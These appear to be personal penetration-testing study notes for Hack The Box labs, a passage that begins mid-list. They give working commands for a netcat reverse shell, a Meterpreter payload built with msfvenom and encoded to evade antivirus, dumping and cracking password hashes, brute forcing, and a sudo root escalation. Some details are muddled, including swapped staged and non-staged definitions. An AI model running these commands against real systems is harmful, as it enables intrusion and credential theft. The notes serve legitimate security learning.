       - `-l`: Tells Ncat to listen for incoming connection.
          - `-n`: Indicates that we are listening for numeric IP addresses.
         - `-v`: Means verbose, which will print more information about the connection.
         - `-p <port number>`: Specifies which port to listen on. 
         - `-e`: Executes a bash shell, specifically, `/bin/bash`.




- **reverse shell**

- Hacker machine: `nc -lvnp 444`
- Victim machine: `nc <ip address of victim> -e /bin/bash`

- After a connection is established using either method some useful commands to run
- `whoami`
- `ifconfig`
- `pwd`

  **Creating a custom payload with Metasploit using `msfvenom`**

  - You can deliver payloads by exploiting vulnerabilities in services/OS or by social engineering - with either method you have to deliver a payload

  - Goal of the payload is to have the victim call back to hacker's C2 server C2 server with SYN packets

  - `msfvenom` is part of metasploit that can be used to create custom payloads. Its easy to create a payload, but the challenge is to **encode** it well enough so it is able to evade the IDS/AV solutions

    - `-p` designates the Metasploit payload we want to use.
    - `-e` designates the encoder we want to use.
    - `-a` designates the architecture we want to use (the default is `x86`).
    - `-s` designates the maximum size of the payload.
    - `-i` designates the number of iterations with which to encode the payload.
    - `-x` designates a custom executable file to use as a template.
    - `-o` designates an output file to be created, specifying its name and location.


- `msfvenom -l payloads` will show a list of all the available payloads in metasploit
- `msfvenom -l encoders` These are algorithms that encodes the script so that is becomes less likely to be detected
- `msfvenom -l formats` These list the various formats the code should be at like python, runy, bash etc

- The purpose of the msfvenom command is to generate a payload script that when run on the victim machine will establish a retrograde connection with the hacker's machine

Things to take into account when desiging a payload
1. Staged vs stageless. Generally staged is preferred- Its the delivery mechanism, delivering large amount of script in a single instance (stageless) is more likely to fail and thus be error prone
2. Architecture `-a x86` is common
3. Encoder to use `-e x86/shikata_ga_nai` is common to use
4. Defining the file type, typically exe `-f exe`
5. Path where the file will be placed after creation could be in the `temp` folder, or `www` folder - is specified using the `-o` flag
6. The listening host and the port, which is usually defined for the hacker's machine

  - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/hack.exe LHOST=192.168.0.8 LPORT=4444`

      - `msfvenom`: Launches the `msfvenom` program.

      - `-p`: Indicates payload. 

      - `windows/meterpreter/reverse_tcp`: The Metasploit command module.

      - `-a x86`: Designates the architecture we will use. `x86` is default.

      - `-e x86/shikata_ga_nai`: Designates the encoder we will use.

      - `-f exe`: Indicates the file type to create. In this case, `.exe`.

      - `-o /tmp/malware.exe`: Creates an output file, naming the file (`malware.exe`) and location (inside the `/tmp` directory).

**Meterpreter**

- Runs in memory-does not create files
- encrypts all communication to and from victim machine

Opening a Meterpreter session on a target host consists of four main steps:

1. Exploiting the target. Done with runing exploits on rhost ip address, this also opens a meterpreter session

2. Uploading a Meterpreter payload on the target. 

3. Starting a TCP listener.

4. Executing the Meterpreter payload.

The easiest way to open a Meterpreter shell is to select an exploit and set a Meterpreter payload. 
  - A common payload is `windows/meterpreter/reverse_tcp`.

  - **Note:** You can have multiple Meterpreter sessions open on multiple machines.

The following commands are needed to connect to a Meterpreter session:

- `sessions`: Lists all open Meterpreter sessions.

- `sessions -i <Session ID>`: Connects to a designated session.

- `sessions -i 1`: Brings our session to the foreground, meaning any command we run on our host machine will be run on the Meterpreter shell on the target. 

Once we've connected to a Meterpreter session, we can run many other commands to get information on the target:

  - `?`: Prints Meterpreter's help page, which lists all possible commands.

  - `getuid`: Prints user ID.

  - `getwd`: Prints current working directory.

  - `ifconfig`: Prints the victim's network information.

  - `sysinfo`: Gathers system information (OS, architecture, kernel version). 

  - `upload`: Uploads a file to the target.

  - `download`: Downloads a file from the target.

  - `search`: Searches for resources, similar to the `find` command in Linux.

  - `run win_privs`: Provides more detailed Windows privilege information.

  - `run win_enum`: Runs a comprehensive suite of Windows enumerations and stores the results on the attacking machine.



**Payload types**

- Payloads are **staged** (the payload is assembled in multiple parts) or **stageless** (all sent at once). A large size payload is likely to fail

- `set payload windows/x64/meterpreter` see if the options for the staged show up. The goal is to just try an alternative with staged approach if the non-staged approach does not work
- `set payload windows/x64/meterpreter/reverse_tcp` - Note that this is at the exploit level and before you have established the connection

- eternal blue was one of the exploites for the microsoft SMBA version that was exploited by **wannacry** It was developed by NSA. The exploit python code can be found at github (MS17-010-eternal blue)
- msfvenom is another type of payload that can exploit the ftp


- Then once you have gained access, you can type `whoami` or `getuid` to see if you got root access "NT authority/system" is usually root access, then you can explore further with:
    `ls`, `pwd`, `updatedb`, ` locate root.txt`, `locate user.txt`, `cat etc/passwd`, `cat etc/shadow`, `gedit passwd`, `gedit shadow` to copy the contents of your file into text files so you can **unshadow** them using `unshadow passwd shadow` these are the names of the files as you saved using gedit
- What this does is replaces the 'x' in the passwd file with the hash and then you can crack the hashes using **hashcat**
- You can also use `hashdump` after gaining access. What this does is, it will take all the hashes in the accounts on the machine that was exploited with metasploit and then dumps itinto the terminal for you to see and use
- `ftp <ipaddress>` I can attempt connecting to the file server and obtain access to files
- Other commands `shell`, `route print`, `arp -a`, `netstat -ano` these provide additional infromation regarding active connections and ports. `load incognito`

- There are a bunch of commands that we can run with metasploit like after typing gaining access with metasploit I can type 'help" and under the networking section there will be commands that you can run. 


- Netcat - This opens a listening port on our attack box machine `nc <ip address> port` this will establishing a listening port to check if the victim connects with the attack machine
- Reverse shell is when a victim tries to connect with the attack machine - used 95% of the time
- Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
- poping a shell means gaining access to a machine


**Payload** it is the exploit- there are various different options. You send it to a victim and then attempt to open a shell in the victim. It is either staged or unstaged
- Windows type
- Linux type
- Meterpreter
- python

- It is important to know the staged vs non-staged. If one does not work, try the other
- **Staged**- sends all shellcode at once- might not always work `windows/meterpreter_reverse_tcp`
- **Non-staged**- sends the code in stages, is less stable `windows/meterpreter/reverse_tcp

- we can use metasploit or also send exploits manually. One option is openfuck https://github.com/heltonWernik/OpenLuck

**Brute force attack**
- using metasploit : `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt` and then `set rhosts <ip address>` - this is for setting up rhost we can also `set threads 10` `set verbose true` 
- One purpose of a brute force attack is to determine whether the blue team at 

**Credential stuffing**

- foxy proxy - install to firefox

**Scripts for enumerating linux** 
- `LineEnum.sh`
- `linuxprivchecker.py`
- You can transfer these files on the machine and then run these scripts to gain privilidge escalation. The goal is to gain root access. 
- You can create a new folder called personal and then a subdir stuff and place scripts there

- We can also gain sudo level terminal access by running the file that has code to run an interactive bash terminal. This can be run on the victim machine
- `echo "bash -i" > monitor.sh`
- `ls`
- `cat monitor.sh`
- `ls -la`
- `chmod +x monitor.sh`
- `sudo /home/<userdir>/personal/stuff/monitor.sh` When you run this script you will get root access


## Hack the box

General steps:

- Run   `nmap` scan. It can give some estimate of what type of machine are we after, windows/linux and what type of servers maybe running apache. 
- Then you can run `searchsploit` based on the versions that you learnt about. When you look at the version you will have to also decide whether you will be using a 32 bit or 64bit payload
- type the ip of the victim in the terminal to see if there is a webpage available externally, if there is then it maybe an opening for `drbuster` you can analyze this webpage with a `wapalyzer` and review the source code. There might be hidden comments in the source code. 
- Then you can repeat `searchsploit` again if there is any extra information you found from reading the source code
- If you find exploits available. If its a .rb file then it suggests that there is likely a metasploitmodule available. The initial goal is to obtain a reverse powershell- any exploit module that allows remote code execution is money. 
- You can also lookout for any exploit module that can let you upload a file. That way you can upload a file with malacious code that can help you gain access to powershell. For example the code can open a port and then you can tell it to connect to an ip address which is the ip address of your hacking machine and at the same time you can open a listening port on your hacking machine and that way you can connect via a reverse powershell fashion.
- Once you are in then you can run metasploit `msfconsole` for hashdup and do all kinds of things
- It also tells you the limitations of the exploits. For example, it may require authenticated access- then we might have to crack the admin account. Once you figure out the password then you can run the following commands in metasploit.

- `set password <password>` you are telling metasploit what password to use during the exploit if the exploite will depend on authenticated access and you have already figured out the usernam and password
- `set username <admin>` you are specifying what username to use
- `set rhosts <ip address>`
- `set targeturi </nibbleblog>` this is the path to the 'directory page' where you can run the exploit. For instance <ip address>/<admin page> as in www.goolge.com/admin
- `options` This will show the targets

- Note that once you gain access then you should thoroughly explore the webpage- especially look for openings where a file maybe uploaded
- Once you get shell access. you can type `sysinfo`. Look for OS vrsion esp for privilige escalation purposes. `geuid` will tell you what level of user access do you have. 
- Then you can type `shell` to get into the terminal on that host and then type `pwd` to locate where you are at
- Then you can type `whoami` it will tell you the user name then type `cd /home` and then `cd <username>` to get into the user dierectory. Then `ls -la`
- Then you can type `cat user.txt` and `history` to look at all the commands the user has typed or `cat bash_history`
- You can also type `sudo -l` this will tell you if your username requires a password to run it
- Now the next step would be to somewho upload a file contaiing privilidge escalation script and then run it on the host to gain root access
- Note that for example we can use `wget` or `curl` to download the file on our kali linux machine and then through the session created with the victim machne, the file can be transferred over the listening port to the victim 




- **Machine Legacy**

- `nmap -T4 -p- -A <ipaddress>`
    Gives back open ports - basically file sharing, OS version, hostname, Mac address,  smb_version?
- `search smb_version`